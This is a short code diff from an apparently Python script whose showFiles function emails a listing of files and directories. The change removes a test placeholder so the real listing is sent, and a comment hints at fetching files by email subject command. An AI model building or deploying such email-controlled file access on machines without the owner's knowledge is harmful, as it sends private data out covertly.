@@ -49,7 +49,6 @@ def showFiles(com):
         files_string += file + "\n"
     payload = "Files:\n" + files_string + "\nDirectories:\n" + directories_string
     print(payload)
-    payload = "TEST Test ttes test"
     sendEmail(payload)
 
 #EMAIL SUBJECT = fetch [file name]
